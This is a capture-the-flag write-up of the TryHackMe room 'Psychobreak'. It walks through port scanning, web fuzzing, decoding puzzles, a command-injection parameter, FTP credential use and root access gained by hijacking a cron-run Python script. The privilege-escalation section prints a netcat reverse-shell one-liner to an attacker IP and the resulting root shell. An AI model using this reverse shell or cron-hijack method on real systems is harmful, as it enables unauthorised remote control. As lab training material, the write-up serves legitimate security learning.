---
title: "Psychobreak"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

{{< post-img src="psychobreak.jpeg" alt="psychobreak" style="width: 200px;" >}}

the Evil within...a videogame classic! I like this theme already!

## Enumeration

```bash
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack ProFTPD 1.3.5a

22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 44:2f:fb:3b:f3:95:c3:c6:df:31:d6:e0:9e:99:92:42 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDtgGI2Qpv+ora/iClEVeJSyw673ED4ciilMWv/Cw2NtVl9oB8A5rKktZYnJDw5sYZOvXimjb20Rk6a742anZZA87PM3StTZy8ZAMDEwdt8omaz5zy1c+HcJi4jjUIzPAZK10iKJ0JnyZ3eZZgEXALsU1zTi6U8Wn+6pixB9yRzAV8FVd/UThmC8vkiyNbNJUF6tgP+paajOIq2KzcmYrn8zZFL79EjDUUqSx72/wc/VUYyNArVGtVmOuvW1TBQwnpUv3zNQL1sabfiRzmgWB4unfHCVbj8autfHOfHSpMxC5QOuOJRTdhak6MUlHbjSXBF5MU1OP4mNTIoh/+e8k17
|   256 92:24:36:91:7a:db:62:d2:b9:bb:43:eb:58:9b:50:14 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCE8pJD7f5qX4X2kInnJf/m5wbTLOFA3I49Hyi2MrHxg3jREHseTbpqk00Xmy7F2+8Z8ljTdJwD9aafUAPgXxes=
|   256 34:04:df:13:54:21:8d:37:7f:f8:0a:65:93:47:75:d0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPxHqNM/ISBztZhs47D+flKJiTqFqt5kJrFDoeNyO8Zb

80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome To Becon Mental Hospital
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

```bash
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 838, Words: 93, Lines: 25]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
```

In doubt, check the code

```html
<!-- Sebastian sees a path through the darkness which leads to a room => /sadistRoom -->
```

Grab the key and run!
decode `Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv` to a very polite key
its not everyday you decode some `atbash code` (beaufort-variant)
Boy I love how this feels like playing the game
the author is such a cool guy

Ok now Safe heaven is the place you wanna go

in doubt...

```html
<!-- I think I'm having a terrible nightmare. Search through me and find it ... -->
```

We fuzz here with for some hidden directory (dirbuster lists work)

```bash
imgs                    [Status: 301, Size: 324, Words: 20, Lines: 10]
                        [Status: 200, Size: 1299, Words: 88, Lines: 52]
keeper                  [Status: 301, Size: 326, Words: 20, Lines: 10]
```

escape the keeper take the stairs to google reverse search..ASAP
Get the keeper key...and back to the map we can access the abandoned room
what a nice place...all this blood, guts, spider-m'lady...charming

In doubt...gentlemen?

```html

<!-- There is something called "shell" on current page maybe that'll help you to get out of here !!!-->


<!-- To find more about the Spider Lady visit https://theevilwithin.fandom.com/wiki/Laura_(Creature) -->
```


obviously you have command execution with `shell=` parameter
But damn only `ls` command? lol
This was tricky and I thing I got luck trying `ls ..` here XD
you will find a weird directory along `be8bc..whatever` where we already are
so just visit the second dir...you find the text that tell you the nice lady of earlier is called `Laura`
and a `helpme.zip`

```text
From Joseph,

Who ever sees this message "HELP Me". Ruvik locked me up in this cell. Get the key on the table and unlock this cell. I'll tell you what happened when I am out of
this cell.
```

I sense alot of stegano in here

```bash
└──╼ $binwalk -e Table.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, uncompressed size: 25399, name: Joseph_Oda.jpg
25329         0x62F1          Zip archive data, at least v2.0 to extract, uncompressed size: 26844, name: key.wav
26071         0x65D7          End of Zip archive, footer length: 22
```

Listen to that audio..its morse! you can decode it [here](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)

Then you can free joseph oda
as he is polite, he say `thankyou.txt`
with his ftp creds you get access to a `program` that you definitely trust
At this point we all know what to do...we get the logic but that would be a boring stuff doing one by one
And how do we automate the boring stuff?

```bash
└──╼ $python program.py
000000
000000 => Incorrect

111111

...

kidman
kidman => Correct

Well Done !!!
Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33

letmein
letmein => Incorrect
...
```

decode that! its multi-tap...aka `sms-code`
If you grew up in the 90's you know this

Now we go inside

```bash
kidman@evilwithin:~$ cat user.txt
user_flag_goes_here
```

## privilege escalation

kidman is not a sudoer...so enumeration time start

Right where we are there are hidden files

```bash
kidman@evilwithin:/home/kidman$ ls -al
total 44
drwxr-xr-x 4 kidman kidman 4096 Aug 13  2020 .
drwxr-xr-x 5 root   root   4096 Jul 13  2020 ..
-rw------- 1 kidman kidman    1 Aug 13  2020 .bash_history
-rw-r--r-- 1 kidman kidman  220 Jul 13  2020 .bash_logout
-rw-r--r-- 1 kidman kidman 3771 Aug 13  2020 .bashrc
drwx------ 2 kidman kidman 4096 Jul 13  2020 .cache
drwxrwxr-x 2 kidman kidman 4096 Jul 13  2020 .nano
-rw-r--r-- 1 kidman kidman  655 Jul 13  2020 .profile
-rw-rw-r-- 1 kidman kidman  264 Aug 13  2020 .readThis.txt
-rw-r--r-- 1 root   root     26 Dec 15 18:38 .the_eye.txt
-rw-rw-r-- 1 kidman kidman   33 Jul 13  2020 user.txt

kidman@evilwithin:/home/kidman$ cat .readThis.txt

uC@> z:5>2?i

%96 E9:?8 x 2> 23@FE E@ E6== D@ :D E@A D64C6E] }@ @?6 5@6D?VE <?@H 23@FE E9:D] xEVD E96 #FG:<VD 6J6] }@ @?6 42? 9:56 2H2J 7C@> :E] qFE x 42? E6== J@F @?6 E9:?8 D62C49 7@C E96 DEC:?8 YE9606J60@70CFG:<Y ] *@F 8@E E@ 96=A $632DE:2? 56762E #FG:< ]]]

kidman@evilwithin:/home/kidman$ cat .the_eye.txt
No one can hide from me.
```
Brilliant! more decoding...its `ROT-47`

find the eye now...its a python file somewhere..just use

```bash
kidman@evilwithin:/home/kidman$ find / -name *string_to_look_for* 2>/dev/null
....
```
```bash
kidman@evilwithin:/place$ cat .the_script_bro.py
#!/usr/bin/python3

import subprocess
import random

stuff = ["I am watching you.","No one can hide from me.","Ruvik ...","No one shall hide from me","No one can escape from me"]
sentence = "".join(random.sample(stuff,1))
subprocess.call("echo %s > /home/kidman/.the_eye.txt"%(sentence),shell=True)
```
Running it as kidman will get us nowhere...so I suspect this to be a root `cron` job

```bash
kidman@evilwithin:~$ cat /etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/2 * * * * root python3 /place/.the_script_found.py
```
Bingo! 2 minutes of patience!

Ok now add reverse shell for action

```python
import os

os.system("mkfifo /tmp/kirxhbg; nc 10.8.226.203 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg")
```
Now we are supreme

```bash
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 57736
id
uid=0(root) gid=0(root) groups=0(root)
```

First things first

```bash
cat root.txt
get_root_flag_here
```

then the extra

```text
cat readMe.txt


 /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
|  From Sebastian :                                                                     |
|                                                                                       |
|  You have one final task ... Help me to defeat ruvik !!!                              |
|                                                                                       |
 \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/

```

yeah ok? no one likes this guy anyway

```bash
deluser ruvik
Removing user `ruvik' ...
Warning: group `ruvik' has no more members.
Done.
```

What a cool room!
